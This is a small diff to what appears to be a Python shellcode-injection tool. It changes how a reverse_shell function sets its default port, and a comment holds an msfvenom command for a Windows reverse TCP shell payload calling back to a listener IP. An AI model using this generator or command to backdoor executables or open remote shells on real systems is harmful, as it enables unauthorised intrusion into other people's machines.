@@ -76,12 +76,14 @@ def msgbox(oep, nep, base):
     return messagebox
 
 
-def reverse_shell(oep, nep, base, lhost=None, lport=8080):
+def reverse_shell(oep, nep, base, lhost=None, lport=None):
     # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp
     # LHOST=192.168.1.148 LPORT=8080 -f python
 
     if lhost is None:
         lhost = utilities.get_ip()
+    if lport is None:
+        lport = 8080
     ip = utilities.ip_to_hex(lhost)
 
     port = struct.pack('!H', lport)
